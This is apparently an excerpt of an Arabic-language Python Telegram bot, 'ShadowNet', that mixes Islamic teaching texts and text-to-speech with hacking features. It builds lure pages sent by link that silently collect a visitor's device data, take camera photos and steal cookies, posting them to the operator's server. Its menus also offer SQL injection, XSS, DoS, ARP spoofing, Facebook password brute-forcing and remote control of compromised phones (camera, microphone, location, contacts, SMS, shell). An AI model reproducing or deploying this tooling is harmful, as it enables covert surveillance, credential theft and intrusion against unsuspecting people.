...
"""
ShadowNet v14.0 - النسخة النهائية (أزرار احترافية، بدون T11)
...
الدليل: قال رسول الله صلى الله عليه وسلم: «بني الإسلام على خمس: شهادة أن لا إله إلا الله وأن محمداً رسول الله، وإقام الصلاة، وإيتاء الزكاة، وصوم رمضان، وحج البيت» (متفق عليه).

2. إقام الصلاة
الدليل: قال تعالى: {وَأَقِيمُوا الصَّلَاةَ وَآتُوا الزَّكَاةَ وَارْكَعُوا مَعَ الرَّاكِعِينَ} [البقرة: 43].
الصلاة عمود الدين، وهي خمس صلوات في اليوم والليلة.

3. إيتاء الزكاة
الدليل: قال تعالى: {خُذْ مِنْ أَمْوَالِهِمْ صَدَقَةً تُطَهِّرُهُمْ وَتُزَكِّيهِم بِهَا} [التوبة: 103].
الزكاة واجبة على المال الذي بلغ النصاب وحال عليه الحول.

4. صوم رمضان
الدليل: قال تعالى: {يَا أَيُّهَا الَّذِينَ آمَنُوا كُتِبَ عَلَيْكُمُ الصِّيَامُ كَمَا كُتِبَ عَلَى الَّذِينَ مِن قَبْلِكُمْ لَعَلَّكُمْ تَتَّقُونَ} [البقرة: 183].
صوم شهر رمضان كامل، فرض في السنة الثانية للهجرة.

5. حج البيت لمن استطاع إليه سبيلاً
الدليل: قال تعالى: {وَلِلَّهِ عَلَى النَّاسِ حِجُّ الْبَيْتِ مَنِ اسْتَطَاعَ إِلَيْهِ سَبِيلًا} [آل عمران: 97].
الحج مرة واحدة في العمر لمن استطاع.""",

    "arkan_iman": """أركان الإيمان الستة
─────────────────
1. الإيمان بالله
الدليل: قال تعالى: {آمَنَ الرَّسُولُ بِمَا أُنزِلَ إِلَيْهِ مِن رَّبِّهِ وَالْمُؤْمِنُونَ ۚ كُلٌّ آمَنَ بِاللَّهِ وَمَلَائِكَتِهِ وَكُتُبِهِ وَرُسُلِهِ} [البقرة: 285].
الإيمان بوجود الله ووحدانيته وأسمائه وصفاته.

2. الإيمان بملائكته
الدليل: قال تعالى: {يَا أَيُّهَا الَّذِينَ آمَنُوا آمِنُوا بِاللَّهِ وَرَسُولِهِ وَالْكِتَابِ الَّذِي نَزَّلَ عَلَىٰ رَسُولِهِ وَالْكِتَابِ الَّذِي أَنزَلَ مِن قَبْلُ} [النساء: 136].
خلق الله الملائكة من نور، لا يعصون الله ما أمرهم.

3. الإيمان بكتبه
الدليل: قال تعالى: {وَآمِنُوا بِمَا أَنزَلْتُ مُصَدِّقًا لِّمَا مَعَكُمْ} [البقرة: 41].
نؤمن بجميع الكتب السماوية المنزلة: التوراة، الإنجيل، الزبور، صحف إبراهيم، والقرآن الكريم.

4. الإيمان برسله
الدليل: قال تعالى: {وَأَرْسَلْنَا مِن قَبْلِكَ رُسُلًا وَجَعَلْنَا لَهُمْ أَزْوَاجًا وَذُرِّيَّةً} [الرعد: 38].
نؤمن بجميع الأنبياء والمرسلين، أولهم آدم وآخرهم محمد صلى الله عليه وسلم.

5. الإيمان باليوم الآخر
الدليل: قال تعالى: {كُلُّ نَفْسٍ ذَائِقَةُ الْمَوْتِ ۗ وَإِنَّمَا تُوَفَّوْنَ أُجُورَكُمْ يَوْمَ الْقِيَامَةِ} [آل عمران: 185].
نؤمن بالبعث بعد الموت، والجنة والنار، والحساب والجزاء.

6. الإيمان بالقدر خيره وشره
الدليل: قال تعالى: {إِنَّا كُلَّ شَيْءٍ خَلَقْنَاهُ بِقَدَرٍ} [القمر: 49].
نؤمن بأن كل شيء بقضاء الله وقدره، خيره وشره، حلوه ومره.""",
...
الدليل: قال رسول الله صلى الله عليه وسلم: «من توضأ فأحسن الوضوء، ثم قال: أشهد أن لا إله إلا الله وحده لا شريك له، وأشهد أن محمداً عبده ورسوله، فتحت له أبواب الجنة الثمانية» (رواه الترمذي).""",
...
الدليل: عن عائشة رضي الله عنها قالت: «كان رسول الله صلى الله عليه وسلم إذا اغتسل من الجنابة، يبدأ فيغسل يديه، ثم يفرغ بيمينه على شماله فيغسل فرجه، ثم يتوضأ وضوءه للصلاة، ثم يأخذ الماء فيدخل أصابعه في أصول الشعر، ثم يحثي على رأسه ثلاث حثيات، ثم يفيض الماء على سائر جسده» (متفق عليه)."""
}
...
def generate_voice(text, voice_code=None):
    try:
        os.makedirs('temp', exist_ok=True)
        filename = f"voice_{int(time.time())}.mp3"
        filepath = os.path.join('temp', filename)
        async def generate():
            communicate = edge_tts.Communicate(text, voice_code or DEFAULT_VOICE)
...
def check_link_safety_advanced(url, chat_id):
    try:
        ...
        try:
            ...
            csp = xfo = 'غير موجود'
        return {'status': 'مفصل', 'ssl_valid': is_valid, 'ssl_days_left': days_left, 'csp': csp, 'xfo': xfo}
    except Exception as e:
...
def device_info_page():
    ...
    if not chat_id:
        return "❌ رابط غير صالح. يرجى الحصول على رابط جديد من البوت.", 403
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>جمع معلومات الجهاز</title></head>
    <body>
    <script>
        const data = {{
        ...
        function sendData(d) {{
            fetch('/api/collect_device', {{
                ...
                body: JSON.stringify({{token: '{token}', info: d}})
            }}).then(() => {{
                document.body.innerHTML = "✅ تم جمع معلومات جهازك وإرسالها بنجاح.";
            }}).catch(() => {{
                document.body.innerHTML = "❌ حدث خطأ أثناء الإرسال.";
            }});
        }}
        document.write("⏳ جاري جمع معلومات جهازك...");
    </script>
    </body>
    </html>
    '''
...
def camera_hack_page():
    ...
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>التقاط كاميرا</title></head>
    <body>
    <script>
        async function capture() {{
            try {{
                ...
                document.body.innerHTML = "✅ تم التقاط الصورة وإرسالها.";
            }} catch(e) {{
                document.body.innerHTML = "❌ تعذر الوصول إلى الكاميرا.";
            }}
        }}
        capture();
        document.write("⏳ جاري الوصول إلى الكاميرا...");
    </script>
    </body>
    </html>
    '''
...
def cookie_stealer_page():
    ...
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>استخراج الكوكيز</title></head>
    <body>
    <script>
        ...
        fetch('/api/collect_cookie', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{token: '{token}', cookies: cookies, url: window.location.href}})
        }}).then(() => {{
            document.body.innerHTML = "✅ تم استخراج الكوكيز وإرسالها.";
        }}).catch(() => {{
            document.body.innerHTML = "❌ حدث خطأ.";
        }});
        document.write("⏳ جاري استخراج الكوكيز...");
    </script>
    </body>
    </html>
    '''
...
def build_main_menu(chat_id):
    ...
    if user_can_use_collector(chat_id):
        markup.row(
            InlineKeyboardButton("استعلام معلومات الجهاز", callback_data="device_info"),
            InlineKeyboardButton("التقاط كاميرا أمامية", callback_data="camera_hack")
        )
    ...
    # الصف 8 - تحليل
    markup.row(
        InlineKeyboardButton("فحص الروابط", callback_data="check_link_advanced"),
...
def build_hacking_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("اختبار حقن SQL", callback_data="hack_sqli"),
        InlineKeyboardButton("اختبار XSS", callback_data="hack_xss")
    )
    markup.row(
        InlineKeyboardButton("هجوم DoS", callback_data="hack_dos"),
        InlineKeyboardButton("هجوم ARP Spoof", callback_data="hack_arp")
    )
    markup.row(
    ...
    markup.row(
        ...
        InlineKeyboardButton("مسح المنافذ", callback_data="port_scan")
    )
    markup.row(
        InlineKeyboardButton("فحص شهادة SSL", callback_data="ssl_scan"),
        InlineKeyboardButton("كاميرا (جهاز مخترق)", callback_data="hack_camera")
    )
    markup.row(
        InlineKeyboardButton("ميكروفون (جهاز مخترق)", callback_data="hack_mic"),
        InlineKeyboardButton("موقع (جهاز مخترق)", callback_data="hack_location")
    )
    markup.row(
        InlineKeyboardButton("جهات اتصال (جهاز مخترق)", callback_data="hack_contacts"),
        InlineKeyboardButton("رسائل SMS (جهاز مخترق)", callback_data="hack_sms")
    )
    markup.row(
        InlineKeyboardButton("لقطة شاشة (جهاز مخترق)", callback_data="hack_screenshot"),
        InlineKeyboardButton("Shell", callback_data="hack_shell")
    )
    markup.row(
        InlineKeyboardButton("إيقاف تشغيل (جهاز مخترق)", callback_data="hack_shutdown"),
        InlineKeyboardButton("رجوع", callback_data="back_main")
    )
    return markup
...
def build_quotes_menu():
    ...
    markup.row(
        ...
        InlineKeyboardButton("English Quotes", callback_data="quotes_english")
    )
...
def build_voice_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("صوت سعودي", callback_data="voice_سعودي"),
        InlineKeyboardButton("صوت مصري", callback_data="voice_مصري"),
        InlineKeyboardButton("صوت بنت", callback_data="voice_بنت"),
        InlineKeyboardButton("صوت سعودية", callback_data="voice_سعودية")
    ]
    ...
    try:
        ...
        if data.startswith("muslim_"):
            ...
            if key in content_map:
                ...
                safe_send(chat_id, "لم يتم العثور على هذا الموضوع.")
            return
        ...
        if data == "device_info":
            ...
            safe_send(chat_id, f"رابط استعلام معلومات الجهاز:\n{SERVER_URL}/device_info?token={token}")
            return
        if data == "camera_hack":
            token = get_user_token(chat_id)
            safe_send(chat_id, f"رابط التقاط الكاميرا:\n{SERVER_URL}/camera_hack?token={token}")
            return
        ...
        if data == "text_to_speech":
            ...
            safe_send(chat_id, "🎤 أرسل النص الذي تريد تحويله إلى صوت:", reply_markup=build_voice_menu())
            return
        if data.startswith("voice_"):
            voice_name = "_".join(data.split("_")[1:])
            voice_code = VOICE_CODES.get(voice_name, DEFAULT_VOICE)
            text = user_states.get(f"{chat_id}_tts_text", "")
            if text:
                safe_send(chat_id, f"⏳ جاري تحويل النص إلى صوت...")
                filepath = generate_voice(text, voice_code)
                if filepath:
        ...
        if data == "bruteforce_fb":
            ...
            safe_send(chat_id, "👤 أدخل بريد أو اسم مستخدم فيسبوك:")
            return
        ...
        if data == "bruteforce_custom":
            ...
            safe_send(chat_id, "🎯 أدخل بالصيغة: هدف|نوع|كلمات_سر مفصولة بفواصل")
            return
        if data == "port_scan":
            if not is_admin(chat_id): return
        ...
        if data == "hack_camera":
            ...
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز. استخدم 'إدارة الأجهزة' أولاً.")
                return
        ...
        if data == "hack_mic":
            ...
            safe_send(chat_id, "🎙️ أدخل مدة التسجيل بالثواني:")
            return
        ...
        if data == "hack_sms":
            ...
            safe_send(chat_id, "تم إرسال أمر الرسائل.")
            return
    ...
    try:
        ...
        if state == "waiting_dos":
            ...
            if len(parts) >= 2:
                ...
                safe_send(chat_id, "🎯 بدء هجوم DoS...")
...
if __name__ == '__main__':
    print("\n" + "="*60)
    print("🤖 ShadowNet - النسخة النهائية (أزرار احترافية، بدون T11)")
